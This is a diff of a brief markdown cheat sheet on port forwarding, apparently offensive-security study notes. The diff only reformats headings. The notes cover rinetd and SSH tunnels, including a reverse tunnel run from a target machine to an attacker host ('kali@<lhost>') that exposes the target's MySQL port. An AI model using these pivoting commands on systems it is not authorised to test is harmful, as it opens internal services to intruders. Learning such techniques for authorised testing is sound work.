@@ -1,8 +1,10 @@
 # Port forwarding
 
-### rinetd
+[back](readme.md)
 
-```text
+## rinetd
+
+```
 rinetd
 cat /etc/rinetd.conf
 0.0.0.0 <local_port> <target> <target_port>
@@ -10,9 +12,9 @@ sudo service rinetd restart
 ss -antp
 ```
 
-### SSH
+## SSH
 
-```text
+```
 # run on target machine
 ssh -R 4444:127.0.0.1:3306 kali@<lhost>
 
@@ -20,7 +22,7 @@ ssh -R 4444:127.0.0.1:3306 kali@<lhost>
 mysql -u root -h 127.0.0.1 -P 4444
 ```
 
-```text
+```
 # -L local
 # -R remote
 # -D dynamic
